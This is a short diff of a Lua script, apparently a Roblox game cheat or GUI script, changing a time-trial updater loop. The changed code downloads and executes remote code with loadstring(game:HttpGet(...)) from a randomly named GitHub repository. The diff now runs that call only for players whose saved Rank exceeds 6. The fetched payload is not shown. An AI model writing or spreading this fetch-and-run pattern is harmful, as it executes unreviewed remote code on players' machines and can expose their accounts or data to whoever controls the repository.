@@ -150,7 +150,11 @@ local function startGuiUpdater()
         timeTrialLabel.Text = tostring(getRunsLeft()) .. "/10"
         updateLabelSize(timeTrialLabel)
 		if getRunsLeft() > 0 then
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/teleport_w1234"))()
+			local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+			local rank = Save.Get().Rank
+			if rank > 6 then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/teleport_w1234"))()
+			end
 		end
         pointsLabel.Text = tostring(getTimeTrialPoints())
         updateLabelSize(pointsLabel)
